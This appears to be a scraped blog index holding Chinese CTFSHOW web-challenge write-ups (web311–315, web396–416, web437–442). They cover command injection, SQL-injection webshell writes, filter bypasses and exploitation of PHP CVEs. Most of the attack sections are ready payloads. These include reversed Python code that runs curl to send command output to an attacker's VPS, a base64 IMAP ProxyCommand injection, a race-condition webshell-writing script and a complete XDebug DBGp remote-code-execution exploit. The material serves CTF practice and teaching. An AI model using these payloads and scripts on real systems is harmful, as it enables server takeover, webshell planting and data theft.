&quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) if '\\\\u' in code: return 'hacker?' reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 多了个if '\\\\u' in code，\\\\u 是一种表示 Unicode 编码字符 的转义序列 具体说明： 在字符串里，\\u 后面跟着 4 位十六进制数字，用来表示一个 Unicode 字符的编码 比如 \\u4f60 表示汉字 “你”，\\u597d 表示汉字 “好” 这种写法在很多编程语言和数据格式（如 JSON）中都用来表达非 ASCII 字符 这次过滤对我们影响不大，可以继续用上题的步骤 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1]))","link":"/posts/ctfshow-others-2-web417-web437/"},{"title":"CTFSHOW | 其他篇题解（一）web396 - web416","text":"前言由于题目比较多，所以分三个部分来写，这是第一部分 题目列表web396打开题目，可以看到给出了代码 会解析传入的URL，然后提取其中的host和path放入代码中执行 我们分析一下URL结构，举个例子 1https://www.example.com:8080/path/to/resource?user=alice#section1 部分 示例 说明 scheme https 协议（常见有http、https、ftp等） host www.example.com 主机地址/域名 port 8080 端口号（省略时默认http是80，https为443） path /path/to/resource 路径，资源在服务器的位置 query ?user=alice 查询参数 fragment #section1 页面锚点，供浏览器滚动到指定位置 回到题目，shell_exec函数可以执行系统命令，因此有很多方法可以做这题 方法一：反引号执行系统命令 用反引号执行系统命令，传入参数 1?url=http://`ls`/var/www/html/1.txt 然后打开1.txt查看结果 直接读取flag即可 1?url=http://`cat fl0g.php`/var/www/html/1.txt 方法二：$()执行系统命令 在Shell脚本或命令行里，$()语法可以用来执行系统命令。它的作用叫“命令替换”：会把括号里的命令先执行，然后用输出结果代替$()这个表达式的内容 读取当前目录内容 1?url=http://$(ls)/var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/var/www/html/1.txt 方法三：分号截断命令 可以用分号截断当前命令，然后执行新命令，可以直接写文件、写webshell，或者反弹shell都可以，看你喜欢哪个 读取当前目录内容 1?url=http://1/1;echo `ls` &gt; 1.txt 读取flag 1?url=http://1/1;echo `cat fl0g.php` &gt; 1.txt web397这次把内容写进了/tmp目录里 因为/tmp是在根目录，用../返回上一级即可，方法跟之前一样 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt 方法三：分号截断命令 读取当前目录内容 1?url=http://1/1;echo `ls` &gt; 1.txt 读取flag 1?url=http://1/1;echo `cat fl0g.php` &gt; 1.txt web398对host部分过滤了分号，方法三用不了，其他步骤跟web397一样 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt web399对host过滤了分号和&gt;，影响的还是步骤三，步骤一和步骤二不影响 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt web400在web399的基础上多过滤了http和https，且不区分大小写，不过影响不大，步骤跟上题一样 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt web401这题把解析后的URL打印了出来，然后比上题多过滤了反斜杠，不过不影响做题 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt web402这题对scheme协议做了过滤，要求不能出现http和https，随便输入个东西替换即可 方法一：反引号执行系统命令 把http换成1，然后跟之前一样传参即可 1?url=1://`ls`/../var/www/html/1.txt 读取1.txt内容 读取flag 1?url=1://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=1://$(ls)/../var/www/html/1.txt 读取flag 1?url=1://$(cat fl0g.php)/../var/www/html/1.txt web403先看看代码 过滤规则改了，我们分析一下 1if(preg_match('/^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$/', $url['host'])){ 这段代码用正则表达式判断 $url['host'] 是否是一个合法的IPv4地址。具体解释如下： /^...$/ ：匹配整个字符串（从头到尾），保证整个输入就是IP，不夹杂其他字符 ((2[0-4]\\d|25[0-5]|[1]?\\d\\d?)\\.){3} ：匹配前三段，每段数字+点。每段数字规则如下： 2[0-4]\\d：匹配200-249 25[0-5]：匹配250-255 ?\\d\\d?：匹配0-199（包括1位、2位、3位数字，即0-9、00-99、100-199） 最后一段没有点，只剩数字部分，规则同上 综合起来，这个正则表达式能精确匹配0.0.0.0~255.255.255.255范围内的IPv4地址格式 因此之前的方法一和方法二都用不了，但是方法三可以用了，咱们用分号截断之前的命令并执行新命令 读取当前目录内容 1?url=http://127.0.0.1/1;echo `ls` &gt; 1.txt 读取flag 1?url=http://127.0.0.1/1;echo `cat fl0g.php` &gt; 1.txt web404这题说起来挺好笑的，刚开始看到标题写了“容器生成较慢，得多等一会儿”，我真以为要多等一会，硬生生等了几十分钟，结果点进去还是404，就觉得奇怪。后面看到图片还一闪一闪的，好家伙这网页还带自动刷新的，发现不对劲后点开源码看看，结果真被坑了 后面想了一会，应该是因为这题是web404，估计官方想借此整活，也是被气笑了 回归正题，我们看到源码里写了404.php，拼接进网页访问 可以看到比上题多了个正则匹配 1if(preg_match('/^\\/[A-Za-z0-9]+$/', $url['path'])){ 简单来说，这个正则表达式检测的字符串必须是： 以斜杠 / 开头 斜杠后面跟着至少一个字母或数字 整个字符串中不能有空格或其他符号 比如符合的路径有： /abc /A1B2C3 /12345 然后host部分的正则匹配也改了 1if(preg_match('/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)./', $url['host'])){ 其中： (2[0-4]\\d|25[0-5]|[1]?\\d\\d?) 是0-255范围内的一段数字 ((...)\\.){3} 表示前三个数字段加点 但因为最后的.是匹配任意字符，该正则会匹配形如“192.168.1.1a”或“10.0.0.1/”这类，末尾允许至少跟着一个字符，不是严格的IP地址校验。而且也没有用开头 ^ 和结尾 $ 锚点来表示必须完全匹配整个字符串，这给了我们机会，可以用分号截断命令 读取当前目录内容 1?url=http://127.0.0.1;echo `ls` &gt; 1.txt;/1 读取flag 1?url=http://127.0.0.1;echo `cat fl0g.php` &gt; 1.txt;/1 web405先看看代码 这次多了对scheme的检测，要求必须包含波浪号、点号或者php字符其中之一，因此我们改一下协议即可，方法跟之前一样 读取当前目录内容 1?url=php://127.0.0.1;echo `ls` &gt; 1.txt;/1 读取flag 1?url=php://127.0.0.1;echo `cat fl0g.php` &gt; 1.txt;/1 web406先看代码 源码提示flag in db，说明flag放在数据库。然后对传入的参数url进行了过滤，去除了无效url地址 用联合注入写入webshell即可，空格用/**/代替，不然会不行 1?url=http://127.0.0.1/'union/**/select/**/1,'&lt;?=eval($_POST[1]);?&gt;'/**/into/**/outfile/**/'/var/www/html/1.php# 然后打开1.txt查看，可以看到成功写入 蚁剑连接webshell即可 可以看到有个config.php配置文件 打开可以获取数据库账号密码 然后打开数据库操作页面 添加数据库，如图所示 成功找到flag web407先看代码 这题改成了要求输入参数ip，且要求必须为IP地址以通过FILTER_VALIDATE_IP验证 然后我们的目标是执行cafe类的add函数，可以用::来调用函数 payload： 1?ip=cafe::add cafe::add会被当成IPv6地址，从而通过FILTER_VALIDATE_IP验证，展开的话就类似 1cafe:0000:0000:0000:0000:0000:0000:0add 然后打开网页源代码查看flag即可 我们分析一下IPv6构造： IPv6地址的构造规则比较复杂，支持多种简写和压缩形式 IPv6地址由8组4位十六进制数字（0-9，a-f）组成，中间用冒号 : 分隔，如 2001:0db8:85a3:0000:0000:8a2e:0370:7334 可以使用双冒号 :: 缩写连续的零，比如 2001:db8::1 表示中间连续的0可省略 各部分区段中的数字可以使用小写或大写的十六进制字符 用个表格来概括就是 特点 说明 长度 128位（二进制） 分组 8组，每组16位，用冒号分隔 表示 采用十六进制数字表示，每组4位 前导零省略 可省略每组开头的零 连续多个0压缩为:: 每个地址只能出现一次:: 地址类型多样 单播、组播、任播，特殊前缀表示不同用途 IPv4兼容和过渡地址 支持将IPv4嵌入IPv6地址 接口标识符自动生成 通过EUI-64等标准根据MAC生成 例如，典型IPv6地址是 12001:0db8:85a3::8a2e:0370:7334 它等价于展开的 12001:0db8:85a3:0000:0000:8a2e:0370:7334 web408先看代码 这次改成了验证是否满足邮箱格式了，我们介绍一下FILTER_VALIDATE_EMAIL FILTER_VALIDATE_EMAIL 是 PHP 内置的一个专门用来验证电子邮件格式是否合法的过滤器 它会根据RFC 5322标准对邮箱格式做校验，包括： 检查是否存在且且只有一个 @ 符号 @ 前面的部分是邮箱用户名，允许的字符包括字母、数字、点 (.)、下划线 (_) 和连字符 (-) 等 @ 后面的部分是邮箱域名，必须包含有效的域名格式，比如 example.com，包含至少一个点号 (.)，并且顶级域名部分也要正确 避免使用不合法或不允许的特殊字符 验证邮箱的整体格式符合国际标准，不过不验证邮箱是否真实存在 然后file_put_contents格式为 1file_put_contents(string $filename, mixed $data [, int $flags = 0 [, resource $context]]) $filename：要写入的文件路径和名称，如果文件不存在，则会自动创建 $data：写入文件的数据，可以是字符串、数组或者流资源 $flags（可选）： FILE_APPEND：将数据追加到文件末尾，而不是覆盖 LOCK_EX：写入时给文件加独占锁，以防止其他进程同时写入导致数据混乱 FILE_USE_INCLUDE_PATH：在包含路径中搜索文件 $context（可选）：用于修改资源流的行为 可以把非法字符放在双引号里绕过email@的前缀限制，因此payload为 1?email=&quot;&lt;?=eval($_POST[1]);?&gt;&quot;@1.php 然后蚁剑连接 在根目录找到flag web409先看代码 会过滤掉任意字符后的flag，这题我们可以通过闭合PHP代码来做 payload： 1?email=&quot;flageval($_POST[1]);?&gt;&quot;@1.com 通过在前面加上flag来触发$email=preg_replace('/.flag/', '', $email);这一行代码，会删掉前面的&quot;flag，接着?&gt;闭合代码 然后POST传参执行命令即可 11=system('ls /'); 读取flag即可 11=system('cat /flag'); web410先看代码 这次是通过布尔判断输入的b是否是”1“ 根据PHP文档，FILTER_VALIDATE_BOOLEAN 会把下列字符串（不区分大小写）视为true： &quot;1&quot; &quot;true&quot; &quot;on&quot; &quot;yes&quot; 以下对应的字符串（不区分大小写）视为false： &quot;0&quot; &quot;false&quot; &quot;off&quot; &quot;no&quot; &quot;&quot;（空字符串） 然后题目过滤了大于0的数字和true字符串，那我们传入on和yes都可以，大小写都行 payload： 1?b=yes 或者 1?b=on web411先看代码 跟上题一样，不过这次把on的大小写过滤了，我们用yes或TRUE等都可以，太多方法可以绕过了 payload： 1?b=yes web412先看代码 这次是POST传参ctfshow，然后添加到flag.php末尾，同时前面还有个注释符// 用%0a换行即可 payload： 1ctfshow=%0aeval($_POST[1]); 然后蚁剑连接webshell 在flag.php找到flag web413这题相比上一题，注释的方式改了 ctfshow变量被包含在多行注释符/**/里面了 只需前后加个注释符即可 payload： 1ctfshow=*/eval($_POST[1]);/* 然后跟上题一样，蚁剑连接webshell，在flag.php找到flag web414先看代码 我们简单分析一下代码 1if ($ctfshow == true) 判断变量$ctfshow是否等于true，只有在$ctfshow为真时，才会执行内部判断 1sqrt($ctfshow) &gt;= sqrt(intval($flag)) sqrt()是取平方根函数 intval($flag)将$flag转换为整数 判断$ctfshow的平方根是否大于等于$flag整数值的平方根 只有当$ctfshow的平方根小于$flag整数的平方根时，才会显示flag 然后我们再来分析一般情况下布尔判断条件 被视为 false 的值： 布尔 false 整数 0 浮点数 0.0 空字符串 &quot;&quot;（包含字符串 “0”） 字符串 &quot;0&quot; 空数组 [] NULL 被视为 true 的值： 任意非零数字，例如1、-1、3.14 非空字符串，且不等于 &quot;0&quot;，如 &quot;false&quot;、&quot;off&quot;、&quot;hello&quot; 等都会被认为是真 非空数组 资源类型 对象 因此这题我们只要传入非零负数即可成功通过验证 payload： 1?ctfshow=-1 web415先看代码 在PHP中，函数名是不区分大小写的，这意味着定义函数时用的名字，如getflag()，在调用时可以写成getflag()、GetFlag()、GETFLAG()等，都会被正确识别并调用 不过需要注意的是，虽然函数名调用不区分大小写，但变量名是区分大小写的 payload： 1?k=getFlag 然后源代码查看flag即可 web416先看代码 我们要调用的是ctf类中的flag方法，直接用双冒号操作符即可 补充解释一下，它主要用于： 访问类的静态属性和静态方法 访问类的常量 调用父类（parent::）、当前类（self::）、或静态绑定类（static::）的成员 payload： 1?f=ctf::flag 然后源代码查看flag即可","link":"/posts/ctfshow-others-1-web396-web416/"},{"title":"CTFSHOW | phpCVE题解 web311 - web315","text":"题目列表web311打开题目环境，先看看题目使用了什么语言和服务，F12打开网络，或者用Wappalyer查看 可以看到目标环境为 Nginx + PHP-FPM，且PHP版本为7.1 上网搜索对应的漏洞，发现CVE-2019-11043符合我们的要求 具体可以参考链接：https://cloud.tencent.com/developer/article/1530703 漏洞描述 CVE-2019-11043 是一个重要的 PHP-FPM 远程代码执行漏洞，主要影响配置不当的 Nginx + PHP-FPM 网站，攻击者可利用该漏洞执行任意 PHP 代码，进而控制目标服务器 向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常 该漏洞需要在nginx.conf中进行特定配置才能触发，具体配置如下： 12345678910111213location ~ [^/]\\.php(/|$) { ... fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ...} 当用户在请求路径中插入编码为 %0a 的换行符，Nginx 的正则处理会使 PATH_INFO 为空。传递给 PHP-FPM 后，由于变量长度与内容可被精确控制，进而影响内存布局，使攻击者可构造特殊的 FastCGI 参数（如可控伪造 PHP_VALUE） 影响范围 在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行： PHP 7.0 PHP 7.1 PHP 7.2 PHP 7.3 这题要用到的工具是phuip-fpizdam，项目地址：https://github.com/neex/phuip-fpizdam 该工具是基于Go语言构建的，需要先搭建好环境 12345678#更新本地软件包apt-get update#安装Goapt install golang#验证go -version 然后github下载工具 12345678#克隆项目到本地git clone https://github.com/neex/phuip-fpizdam.git#进入工具目录cd phuip-fpizdam#获取依赖包和编译代码go get -v &amp;&amp; go build 然后使用工具执行命令，地址换成自己的 1go run . &quot;http://d654f5bf-2024-4d68-a045-c216dba47a44.challenge.ctf.show/index.php&quot; 最后返回题目，在/index.php?a=执行命令即可，如果没反应就多执行几次 flag在fl0gHe1e.txt里面，执行/index.php?a=cat fl0gHe1e.txt即可 web312打开题目，可以看到一个邮箱登录框 目标环境为Nginx和PHP5.6.38 网上搜索一番，发现CVE-2018-19518符合我们的要求 参考链接：https://blog.csdn.net/weixin_45605352/article/details/116517889 什么是IMAP IMAP（Internet Message Access Protocol，互联网邮件访问协议）是一种用于从邮件服务器远程访问和管理电子邮件的标准协议。与传统的POP3不同，IMAP允许用户在多个设备上同步邮箱状态，邮件内容保留在服务器上，用户对邮件的操作如读取、删除都会实时反馈到服务器，便于多设备协同管理邮箱，实现更灵活和在线的邮件访问体验，通常端口是143 漏洞描述 CVE-2018-19518是PHP IMAP远程命令执行漏洞，漏洞存在于PHP IMAP扩展的imap_open()函数，该函数用于连接IMAP邮件服务器，受到影响的环境通常运行在类Unix系统上，PHP通过imap_open连接远程IMAP服务时会调用底层rsh命令尝试连接 漏洞成因 imap_open()函数中，IMAP服务器名称作为参数传递给rsh（远程shell）命令，在部分系统中，rsh命令被替换为ssh（比如Debian、Ubuntu），而ssh支持更多复杂的命令参数。攻击者可以在构造的IMAP服务器名称中注入-oProxyCommand=参数，这些参数被ssh解释执行，从而执行任意系统命令 imap_open(string $mailbox , string $username , string $password)函数中的mailbox是执行命令参数的一部分，所以我们可以通过更改邮箱名来进行命令注入执行 影响范围 漏洞影响PHP多个版本，包括5.6.0至5.6.38，7.0.0至7.0.32，7.1.0至7.1.24，7.2.0至7.2.12等版本 现在回到题目，先随便输入几个数，看看表单数据 可以看到这里POST上传了三个参数，因为imap_open(string $mailbox , string $username , string $password)函数中的mailbox是执行命令参数的一部分，所以我们可以通过更改它来进行命令注入执行 原始payload： 1x+-oProxyCommand=echo echo '&lt;?php eval($_POST[1]);' &gt; /var/www/html/1.php|base64 -d|sh} 对内容进行base64编码，符号进行URL编码，%3d是等号，%09是制表符 1x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh} 最终payload： 1hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh}&amp;username=111&amp;password=222 显示下面结果即为成功 然后蚁剑连接webshell 成功找到flag web313打开题目，先看看目标环境 也是Nginx + PHP，且PHP版本为5.4.1，上网搜索对应可能的漏洞，发现CVE-2012-1823符合我们的要求 参考链接：https://www.cnblogs.com/lthlsy/p/14820076.html 漏洞描述 CVE-2012-1823 是 PHP-CGI 远程代码执行漏洞，主要出现在 PHP-CGI 模式下。该模式下 PHP 响应 HTTP 请求的方式存在缺陷，导致攻击者能够通过特别构造的 URL 参数，动态修改 PHP 的运行时配置 漏洞成因 漏洞来源于 PHP-CGI 对命令行参数的处理不严谨，攻击者可以在 URL 中插入以 -d 开头的参数（如 -d allow_url_include=1 -d auto_prepend_file=php://input），这些参数本应只由命令行传递，却被 PHP-CGI 错误地解析为运行配置。这就允许攻击者开启危险功能，或通过指定 auto_prepend_file 使 PHP 在执行时读取并执行 HTTP 请求体中的恶意代码，从而实现远程执行任意 PHP 代码 影响范围 该漏洞影响 PHP 5.3.x 和 5.4.x 的早期版本（PHP &lt; 5.3.12 ，PHP &lt; 5.4.2），尤其是在使用 CGI 模式处理请求的环境中更易受害。生产环境中，许多使用 Nginx 反向代理 PHP-CGI 的站点因未做适当配置而成为攻击目标 CGI模式下有如下可控命令行参数可用 12345678910111213-c 指定php.ini文件的位置-n 不要加载php.ini文件-d 指定配置项-b 启动fastcgi进程-s 显示文件源码-T 执行指定次该文件-h和-? 显示帮助 可以用-s显示文件源码 证明确实存在该漏洞，接下来就是执行payload了 1/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input URL编码，%3d是等号，%3a是冒号 1/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a//input 然后请求体写PHP代码执行命令 1&lt;?php echo system(&quot;ls&quot;);?&gt; 最后在/somewhere找到flag web314打开题目，可以看到给出了源码，但是由于禁了冒号，没办法用伪协议 可以正常读取文件 扫描目录，发现有个/phpinfo.php，题目里的源码注释也有提示 拼接进URL访问，发现开启了session，且session.name为PHPSESSID 可以用PHP_SESSION_UPLOAD_PROGRESS进行文件包含，用到条件竞争 payload： 12345678910111213141516171819202122232425262728293031323334import requestsimport ioimport threadingurl = 'http://b14a333f-6a35-4dea-b3e3-d016a1f023b2.challenge.ctf.show/'file_name=&quot;/var/www/html/1.php&quot;file_content='&lt;?php eval($_POST[1]);?&gt;'def write(session): data = { 'PHP_SESSION_UPLOAD_PROGRESS':f&quot;&lt;?php echo 'success!'; file_put_contents('{file_name}','{file_content}');?&gt;&quot; } while event.isSet(): f = io.BytesIO(b'a'*1024*50) session.post(url,cookies={'PHPSESSID':'hello'},data=data,files={'file':('xxx',f)})def read(session): while event.isSet(): response = session.post(url+'?f=/tmp/sess_hello') if 'success!' in response.text: print(&quot;写入成功，访问1.php getshell&quot;) event.clear() break else: passif __name__=='__main__': event = threading.Event() event.set() with requests.session() as session: for i in range(10): threading.Thread(target=write,args=(session,)).start() for i in range(10): threading.Thread(target=read,args=(session,)).start() 显示写入成功即可 蚁剑连接webshell 在根目录成功找到flag 还有一个方法就是用UA头进行日志文件包含 URL拼接参数?f=/var/log/nginx/access.log，然后UA头写入&lt;?php eval($_POST[1]);?&gt;，最后Body写入命令POST发送执行即可 执行命令得到flag web315题目提示debug开启，端口9000 上网搜了一下对应漏洞，发现XDebug 远程调试漏洞符合我们的要求 参考链接：https://blog.csdn.net/zy15667076526/article/details/111824491 XDebug 远程调试漏洞是一种因XDebug扩展的远程调试功能配置不当而引发的严重安全风险。XDebug是PHP的一个调试扩展，主要帮助开发者远程调试PHP代码，比如通过IDE连接服务器进行代码断点调试。当XDebug开启远程调试且配置了xdebug.remote_connect_back=1（或在新版XDebug中对应的xdebug.discover_client_host=1），XDebug会自动尝试连接发起HTTP请求客户端的IP地址以建立调试会话 这个自动“回连”机制如果暴露在公网环境中，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）。连接建立后，攻击者可以通过调试协议(DBGp)主动执行PHP代码，利用该功能中的eval接口实现任意代码执行（RCE）。由于XDebug调试协议没有身份验证，攻击者几乎可以完全控制运行PHP代码的服务器进程 我们可以输入/index.php?XDEBUG_SESSION_START=phpstorm验证一下 响应头中出现了 Set-Cookie: XDEBUG_SESSION=phpstorm，这表示服务器上的 PHP 在启用了 XDebug 调试扩展，并且远程调试功能被激活了，因此可以判断漏洞存在 这个漏洞的利用要用到脚本，可以命名为exp.py payload： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#!/usr/bin/env python3import reimport sysimport timeimport requestsimport argparseimport socketimport base64import binasciiimport socketserverimport threadingimport logginglogging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(levelname)s - %(message)s')server_done = threading.Event()server_started = threading.Event()def recv_xml(sock: socket.socket) -&gt; bytes: blocks = [] data = b'' while True: try: data = data + sock.recv(1024) except socket.error as e: break if not data: break while data: eop = data.find(b'\\x00') if eop &lt; 0: break blocks.append(data[:eop]) data = data[eop+1:] if len(blocks) &gt;= 4: break return blocks[3]class XDebugRequestHandler(socketserver.BaseRequestHandler): def handle(self): logging.info('[+] Recieve data from %s', self.client_address) self.request.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(self.server.code.encode()), b'\\x00'])) data = recv_xml(self.request) logging.info('[+] Recieve data: ' + data.decode()) g = re.search(rb'&lt;\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]&gt;', data, re.I) if not g: logging.warning('[-] No result...') return data = g.group(1) try: logging.info('[+] Result: ' + base64.b64decode(data).decode()) server_done.set() except binascii.Error as e: logging.error('[-] May be not string result: %s', e)class XDebugServer(socketserver.ThreadingMixIn, socketserver.TCPServer): def __init__(self, server_address, handler_class, code): self.code = code self.allow_reuse_address = True super().__init__(server_address, handler_class) def server_activate(self): super().server_activate() logging.info('[+] Server %s started', self.server_address) server_started.set()def start_dbgp_server(port: int, code: str): server = XDebugServer(('0.0.0.0', port), XDebugRequestHandler, code) server_thread = threading.Thread(target=server.serve_forever, daemon=True) server_thread.start() return server_threaddef trigger_debug_session(url: str, attack_ip: str): try: server_started.wait(timeout=5) logging.info('[+] Trigger debug session') headers = { 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0' } if attack_ip: headers['X-Forwarded-For'] = attack_ip requests.get(url + '?XDEBUG_SESSION_START=phpstorm&amp;XDEBUG_SESSION=1&amp;XDEBUG_TRIGGER=1', headers=headers, timeout=5) except: passdef main(): parser = argparse.ArgumentParser(description='XDebug remote debug code execution.') parser.add_argument('-c', '--code', required=True, help='the code you want to execute.') parser.add_argument('-t', '--target', required=True, help='target url.') parser.add_argument('--dbgp-ip', default='', help='dbgp server ip address, must can be accessed from target server.') args = parser.parse_args() start_dbgp_server(9000, args.code) start_dbgp_server(9003, args.code) threading.Thread(target=trigger_debug_session, args=(args.target, args.dbgp_ip), daemon=True).start() try: # Wait with a timeout, but check for interrupts for i in range(20): if server_done.is_set(): break time.sleep(0.5) else: logging.error('[-] Execution timed out') except KeyboardInterrupt: logging.info('[*] Received keyboard interrupt, exiting...')if __name__ == '__main__': main() 然后执行命令，这里用题目给的备用地址http://pwn.challenge.ctf.show:28100/ 1python3 exp.py -t http://pwn.challenge.ctf.show:28100/index.php -c 'shell_exec(&quot;ls&quot;);' cat flaaaxx.php即可，成功拿到flag 1python3 exp.py -t http://pwn.challenge.ctf.show:28100/index.php -c 'shell_exec(&quot;cat flaaaxx.php&quot;);' 1ctfshow{8838-562d8118-4706-427f-8be2-a89a45c752cb}","link":"/posts/ctfshow-phpcve-web311-web315/"},{"title":"CTFSHOW | 其他篇题解（三）web438 - web460","text":"前言由于题目比较多，所以分三个部分来写，这是第三部分 题目列表web438这题跟web435方法一样，我们简单回顾一下过程 为了绕过限制，可以反转代码来执行，具体方法是用字符串切片方法来反转字符串 1?code=str(')&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1]) 可以先用str在网页看原始代码，检查是否正确 然后套个exec执行这串代码就可以 payload： 1?code=str(exec(')&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 我们把它的源码爆出来看看 1?code=str(exec(')&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: return uchar return chr(inside_code)def stringQ2B(ustring): return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) if '\\\\u' in code: return 'hacker?' reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题比web437多过滤了{，但这个符号我们用不到，所以不影响 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) web439这题可以继续用上题的方法，我们把源码爆出来分析一下 1?code=str(exec(')&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 123456789101112131415161718192021222324252627282930313233343536from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: return uchar return chr(inside_code)def stringQ2B(ustring): return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) if '\\\\u' in code: return 'hacker?' if '\\\\x' in code: return 'hacker?' reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到这题比上题多过滤了\\x，\\x 是一种转义序列，用来表示十六进制形式的字符，比如 \\x41 代表 ASCII 字符 'A' 但是我们并没有用到这个，所以不影响 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) web440这题把引号禁了，我们可以用chr构造字符串。先用ord返回unicode数值，然后再经过chr转换成字符即可，我们写个python脚本 payload： 12345s = &quot;import os;os.system('curl http://你的vps地址:端口?p=`ls`')&quot;res = ''for i in s: res += f&quot;chr({ord(i)})%2B&quot;print('str(exec('+res[:-3]+'))') 把结果拼接到网站GET发送 1?code=你的代码运行结果 修改命令为cat /flag获取flag即可 web441经过分析，这题把加号过滤了，放出部分源码看看 1234re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\\'|&quot;|\\+') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;' 那我们用join函数来拼接字符即可，例如.join(['1','2','3'])，结果是 ‘123’。 join必须作为字符串的方法调用，即调用它的对象必须是字符串，所以前面要有字符串和点号（.）来调用该函数 payload： 12345s = &quot;import os;os.system('curl http://你的vps地址:端口?p=`ls`')&quot;res = ''for i in s: res += f&quot;chr({ord(i)}),&quot;print('exec(str().join(['+res[:-1]+']))') 把结果拼接到网站GET发送 1?code=你的代码运行结果 修改命令为cat /flag获取flag即可 web442这题把数字过滤了 